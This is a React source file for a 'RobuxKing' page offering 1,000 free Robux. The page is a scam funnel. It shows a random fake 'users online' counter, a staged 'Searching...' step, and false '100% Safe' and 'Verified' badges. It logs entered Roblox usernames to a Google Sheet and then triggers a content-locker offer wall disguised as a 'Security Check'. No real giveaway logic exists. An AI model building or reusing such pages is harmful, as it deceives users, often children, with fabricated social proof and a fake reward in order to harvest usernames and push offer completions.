import React, { useState, useEffect } from 'react';
import { Shield, Gift, ChevronRight } from 'lucide-react';
import { LiveChat } from './components/LiveChat';
import { Countdown } from './components/Countdown';
import { LockerScript } from './components/LockerScript';
import { RecentWinners } from './components/RecentWinners';
import { saveUserToSheet } from './services/sheetsService';

// Custom SVG Icons for better brand representation
const TikTokIcon = ({ className }: { className?: string }) => (
  <svg viewBox="0 0 24 24" fill="currentColor" className={className}>
    <path d="M12.525.02c1.31-.02 2.61-.01 3.91-.02.08 1.53.63 3.09 1.75 4.17 1.12 1.11 2.7 1.62 4.24 1.79v4.03c-1.44-.05-2.89-.35-4.2-.97-.57-.26-1.1-.65-1.58-1.09v8.32c-.28 3.33-3.14 6.08-6.48 6.08-3.61 0-6.53-2.92-6.53-6.53 0-3.61 2.92-6.53 6.53-6.53.55 0 1.1.08 1.64.23v4.2c-.6-.27-1.29-.35-1.99-.19-1.3.3-2.31 1.4-2.48 2.75-.17 1.39.73 2.73 2.07 3.1 1.68.46 3.42-.5 3.9-2.18.06-.21.1-.43.1-.65V4.67c-1.36.02-2.71.01-4.06.02v-4.6z" />
  </svg>
);

const YouTubeIcon = ({ className }: { className?: string }) => (
  <svg viewBox="0 0 24 24" fill="currentColor" className={className}>
     <path d="M23.498 6.186a3.016 3.016 0 0 0-2.122-2.136C19.505 3.545 12 3.545 12 3.545s-7.505 0-9.377.505A3.017 3.017 0 0 0 .502 6.186C0 8.07 0 12 0 12s0 3.93.502 5.814a3.016 3.016 0 0 0 2.122 2.136c1.871.505 9.376.505 9.376.505s7.505 0 9.377-.505a3.015 3.015 0 0 0 2.122-2.136C24 15.93 24 12 24 12s0-3.93-.502-5.814zM9.545 15.568V8.432L15.818 12l-6.273 3.568z"/>
  </svg>
);

const InstagramIcon = ({ className }: { className?: string }) => (
  <svg viewBox="0 0 24 24" fill="currentColor" className={className}>
    <path d="M12 2.163c3.204 0 3.584.012 4.85.07 3.252.148 4.771 1.691 4.919 4.919.058 1.265.069 1.645.069 4.849 0 3.205-.012 3.584-.069 4.849-.149 3.225-1.664 4.771-4.919 4.919-1.266.058-1.644.07-4.85.07-3.204 0-3.584-.012-4.849-.07-3.26-.149-4.771-1.699-4.919-4.92-.058-1.265-.07-1.644-.07-4.849 0-3.204.013-3.583.07-4.849.149-3.227 1.664-4.771 4.919-4.919 1.266-.057 1.645-.069 4.849-.069zM12 0C8.741 0 8.333.014 7.053.072 2.695.272.273 2.69.073 7.052.014 8.333 0 8.741 0 12c0 3.259.014 3.668.072 4.948.2 4.358 2.618 6.78 6.98 6.98C8.333 23.986 8.741 24 12 24c3.259 0 3.668-.014 4.948-.072 4.354-.2 6.782-2.618 6.979-6.98.059-1.28.073-1.689.073-4.948 0-3.259-.014-3.667-.072-4.947-.196-4.354-2.617-6.78-6.979-6.98C15.668.014 15.259 0 12 0zm0 5.838a6.162 6.162 0 1 0 0 12.324 6.162 6.162 0 0 0 0-12.324zM12 16a4 4 0 1 1 0-8 4 4 0 0 1 0 8zm6.406-11.845a1.44 1.44 0 1 0 0 2.881 1.44 1.44 0 0 0 0-2.881z"/>
  </svg>
);

const FacebookIcon = ({ className }: { className?: string }) => (
    <svg viewBox="0 0 24 24" fill="currentColor" className={className}>
        <path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/>
    </svg>
);

const App: React.FC = () => {
  const [username, setUsername] = useState('');
  const [onlineUsers, setOnlineUsers] = useState(150);
  const [isLoading, setIsLoading] = useState(false);
  const [step, setStep] = useState(1);

  // Load the external script
  useEffect(() => {
    // Fluctuate between 130 and 300
    const interval = setInterval(() => {
      setOnlineUsers(prev => {
        const change = Math.floor(Math.random() * 7) - 3;
        const newValue = prev + change;
        if (newValue < 130) return 130;
        if (newValue > 300) return 300;
        return newValue;
      });
    }, 2000);
    return () => clearInterval(interval);
  }, []);

  const handleVerify = async () => {
    if (!username.trim()) {
      alert("Please enter your Roblox Username!");
      return;
    }

    setIsLoading(true);
    
    // Step 1: Simulate searching
    setTimeout(() => {
      setStep(2);
      // Save to Google Sheets
      saveUserToSheet(username);
    }, 2000);

    // Step 2: Trigger Locker
    setTimeout(() => {
        setIsLoading(false);
        if (typeof window.og_load === 'function') {
            window.og_load();
        } else {
            console.error("Content Locker Script not loaded yet.");
            alert("Security Check Loading... Please wait and click again.");
        }
    }, 3500);
  };

  return (
    <div className="min-h-screen bg-[#0f172a] text-white font-sans overflow-x-hidden relative selection:bg-pink-500 selection:text-white">
      <LockerScript />
      
      {/* Background Effects */}
      <div className="fixed inset-0 z-0 overflow-hidden pointer-events-none">
        <div className="absolute top-0 left-0 w-full h-full bg-gradient-to-br from-indigo-950 via-[#1a0b2e] to-[#0f172a]" />
        
        {/* Animated Orbs */}
        <div className="absolute top-[-10%] left-[-10%] w-[50%] h-[50%] bg-blue-600/20 rounded-full blur-[120px] animate-pulse" />
        <div className="absolute bottom-[-10%] right-[-10%] w-[50%] h-[50%] bg-pink-600/20 rounded-full blur-[120px] animate-pulse" />
        <div className="absolute top-[40%] left-[30%] w-[30%] h-[30%] bg-purple-600/10 rounded-full blur-[100px] animate-float" />
        
        {/* Grid Overlay */}
        <div className="absolute inset-0 bg-[url('https://grainy-gradients.vercel.app/noise.svg')] opacity-20 brightness-125 contrast-150 mix-blend-overlay"></div>
      </div>

      <div className="relative z-10 container mx-auto px-4 py-6 flex flex-col items-center min-h-screen">
        
        {/* Top Bar */}
        <div className="w-full flex flex-col md:flex-row justify-between items-center mb-10 max-w-6xl gap-4">
          <div className="flex items-center gap-3 animate-fade-in-down">
            <div className="bg-gradient-to-br from-pink-500 to-purple-700 p-2.5 rounded-xl shadow-[0_0_20px_rgba(236,72,153,0.5)] border border-pink-400/30">
              <Gift size={28} className="text-white fill-white/20" />
            </div>
            <div className="flex flex-col">
              <span className="font-display font-black text-2xl tracking-tighter uppercase italic leading-none text-white drop-shadow-md">
                Robux<span className="text-transparent bg-clip-text bg-gradient-to-r from-pink-400 to-purple-400">King</span>
              </span>
              <span className="text-[10px] font-bold tracking-widest text-gray-400 uppercase">Official Giveaway Hub</span>
            </div>
          </div>
          
          <div className="flex items-center gap-3 bg-black/40 px-5 py-2 rounded-full border border-white/10 backdrop-blur-md shadow-lg">
            <span className="relative flex h-3 w-3">
              <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-green-400 opacity-75"></span>
              <span className="relative inline-flex rounded-full h-3 w-3 bg-green-500 box-shadow-[0_0_10px_#22c55e]"></span>
            </span>
            <span className="text-sm font-bold text-green-400 tabular-nums">{onlineUsers} Users Online</span>
          </div>
        </div>

        {/* Main Content Layout */}
        <div className="flex flex-col lg:flex-row gap-8 w-full max-w-6xl items-start">
          
          {/* Left Column: Form & Action */}
          <div className="flex-1 w-full">
            <div className="bg-white/5 backdrop-blur-xl border border-white/10 rounded-3xl p-6 md:p-12 shadow-2xl shadow-purple-900/30 relative overflow-hidden group">
              
              {/* Decorative Glow */}
              <div className="absolute -top-32 -right-32 w-64 h-64 bg-purple-500/20 blur-[80px] group-hover:bg-pink-500/20 transition-colors duration-700" />
              <div className="absolute -bottom-32 -left-32 w-64 h-64 bg-blue-500/20 blur-[80px] group-hover:bg-cyan-500/20 transition-colors duration-700" />

              <div className="text-center mb-10 relative z-10">
                <div className="inline-block mb-6 transform hover:scale-105 transition-transform duration-300">
                  <Countdown />
                </div>
                <h1 className="font-display font-black text-5xl md:text-7xl mb-4 text-transparent bg-clip-text bg-gradient-to-b from-white via-purple-100 to-pink-200 drop-shadow-[0_4px_4px_rgba(0,0,0,0.5)]">
                  1,000 ROBUX
                </h1>
                <h2 className="font-display font-black text-3xl md:text-4xl text-transparent bg-clip-text bg-gradient-to-r from-pink-400 via-purple-400 to-indigo-400 mb-6 uppercase tracking-widest drop-shadow-sm">
                   Giveaway Event
                </h2>
                <div className="flex items-center justify-center gap-2 text-lg text-gray-300">
                  <span className="bg-yellow-500/20 text-yellow-300 px-3 py-1 rounded text-sm font-bold border border-yellow-500/30">Limited Time</span>
                  <span>Enter username to claim.</span>
                </div>
              </div>

              {/* Input Form */}
              <div className="space-y-8 max-w-lg mx-auto relative z-10">
                <div className="space-y-3 group/input">
                  <label className="text-xs font-black text-gray-400 uppercase tracking-widest ml-4 group-focus-within/input:text-pink-400 transition-colors">
                    Roblox Username
                  </label>
                  <div className="relative transition-all duration-300 transform group-focus-within/input:scale-105">
                    <input 
                      type="text" 
                      value={username}
                      onChange={(e) => setUsername(e.target.value)}
                      placeholder="e.g. BuilderMan123"
                      className="w-full bg-black/40 border-2 border-white/10 rounded-2xl px-6 py-5 text-xl font-bold text-white placeholder:text-gray-600 focus:outline-none focus:border-pink-500 focus:ring-4 focus:ring-pink-500/20 focus:bg-black/60 transition-all shadow-inner"
                    />
                    <div className="absolute right-5 top-1/2 -translate-y-1/2 text-gray-500 group-focus-within/input:text-green-400 transition-colors">
                       <Shield size={28} />
                    </div>
                  </div>
                </div>

                {/* Main Action Button */}
                <button 
                  onClick={handleVerify}
                  disabled={isLoading}
                  className={`w-full relative group overflow-hidden rounded-2xl p-1 transition-all duration-300 hover:scale-[1.02] active:scale-[0.98] shadow-[0_0_40px_rgba(236,72,153,0.3)] hover:shadow-[0_0_60px_rgba(236,72,153,0.5)] ${isLoading ? 'cursor-wait opacity-90' : ''}`}
                >
                  <div className="absolute inset-0 bg-gradient-to-r from-pink-600 via-purple-600 to-indigo-600 animate-gradient-xy"></div>
                  <div className="absolute inset-0 bg-white/20 blur-md group-hover:bg-white/30 transition-colors"></div>
                  
                  <div className="relative bg-[#13111c] rounded-xl px-8 py-6 flex items-center justify-center gap-4 group-hover:bg-opacity-80 transition-all border border-white/10">
                    {isLoading ? (
                      <>
                        <div className="w-7 h-7 border-4 border-pink-500 border-t-white rounded-full animate-spin"></div>
                        <span className="font-black text-2xl uppercase italic tracking-widest text-white">
                          {step === 1 ? 'Searching...' : 'Connecting...'}
                        </span>
                      </>
                    ) : (
                      <>
                         <span className="font-black text-3xl uppercase italic tracking-widest bg-clip-text text-transparent bg-gradient-to-r from-white via-pink-100 to-white drop-shadow-md">
                          Continue
                        </span>
                        <ChevronRight className="w-8 h-8 text-white group-hover:translate-x-2 transition-transform" strokeWidth={3} />
                      </>
                    )}
                  </div>
                </button>
                
                <p className="text-center text-[10px] text-gray-500 font-medium uppercase tracking-wide">
                  Secure Connection • No Password Needed • 100% Safe
                </p>
              </div>
            </div>
            
            {/* Social Proof Badges - Enhanced Style */}
            <div className="mt-8 grid grid-cols-4 gap-4">
               {[
                 { 
                   icon: YouTubeIcon, 
                   label: "Subscribe", 
                   gradient: "from-red-600 to-red-700", 
                   shadow: "shadow-red-600/40",
                   status: "Proof Soon"
                 },
                 { 
                   icon: TikTokIcon, 
                   label: "Follow", 
                   gradient: "from-black to-gray-900", 
                   shadow: "shadow-gray-600/40",
                   status: "Proof Soon"
                 },
                 { 
                   icon: FacebookIcon, 
                   label: "Like", 
                   gradient: "from-blue-600 to-blue-700", 
                   shadow: "shadow-blue-600/40",
                   status: "Verified"
                 },
                 { 
                   icon: InstagramIcon, 
                   label: "Follow", 
                   gradient: "from-pink-500 via-purple-500 to-orange-500", 
                   shadow: "shadow-pink-600/40",
                   status: "Verified"
                 }
               ].map((item, idx) => (
                 <a href="#" key={idx} className="group relative">
                    <div className={`absolute inset-0 bg-gradient-to-br ${item.gradient} rounded-2xl blur-md opacity-40 group-hover:opacity-100 transition-opacity duration-500`}></div>
                    <div className="relative bg-[#13111c] border border-white/10 rounded-2xl p-4 flex flex-col items-center gap-3 hover:-translate-y-1 transition-transform duration-300 h-full">
                        <div className={`w-12 h-12 flex items-center justify-center rounded-full bg-gradient-to-br ${item.gradient} text-white shadow-lg ${item.shadow} group-hover:scale-110 transition-transform duration-300`}>
                          <item.icon className="w-6 h-6 drop-shadow-sm" />
                        </div>
                        <div className="text-center">
                          <div className="text-[11px] font-black text-gray-300 uppercase tracking-widest group-hover:text-white transition-colors">{item.label}</div>
                          <div className={`text-[8px] font-bold px-1.5 py-0.5 rounded-full mt-1.5 border flex items-center justify-center gap-1 ${item.status === 'Proof Soon' ? 'text-yellow-400 bg-yellow-500/10 border-yellow-500/10' : 'text-green-400 bg-green-500/10 border-green-500/10'}`}>
                             {item.status}
                          </div>
                        </div>
                    </div>
                 </a>
               ))}
            </div>
          </div>

          {/* Right Column: Live Chat & Winners */}
          <div className="w-full lg:w-96 flex flex-col gap-6">
            <LiveChat />
            <RecentWinners />
          </div>

        </div>

        {/* Footer */}
        <footer className="mt-auto pt-16 pb-8 text-center text-gray-600 text-xs font-medium">
          <p className="mb-2">© 2024 Roblox Giveaway Hub. All rights reserved.</p>
          <p className="opacity-50">This site is not affiliated with, endorsed by, or associated with Roblox Corporation.</p>
        </footer>

      </div>
    </div>
  );
};

export default App;